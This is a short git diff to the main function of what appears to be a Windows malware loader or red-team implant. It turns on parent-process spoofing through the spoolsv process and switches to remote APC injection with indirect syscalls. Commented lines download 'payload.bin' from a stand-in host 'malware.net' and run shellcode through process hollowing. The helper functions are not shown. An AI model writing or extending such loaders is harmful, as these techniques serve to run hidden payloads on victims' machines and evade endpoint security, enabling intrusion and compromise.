@@ -17,21 +17,27 @@ int main()
 
 
 
-    // Get spoolsv PID for PPI spoofing
-    // DWORD pid = GetPID();
+    // Get spoolsv PID for PPID spoofing
+    DWORD pid = GetPID();
+
+
 
     // For payload download 
-    // std::vector<BYTE> sh = Download(L"malware.ext\0", L"/payload.bin\0");
+    // std::vector<BYTE> sh = Download(L"malware.net\0", L"/payload.bin\0");
 
-    // For synchronous payload execution with PPID spoofing
-    // raw_exec_ppid(sh, pid);
+
+
+
+    // For synchronous payload execution with PPID spoofing through process hollowing
+    // Indirect_RawExec_ppid(sh, pid);
 
 
 
 
     // For APC execution with indirect syscalls
-    IndirectAPC();
+    // IndirectAPC();
 
 
-
+    // For APC execution in a remote process with indirect syscalls
+    IndirectRemoteAPC(pid);
 }
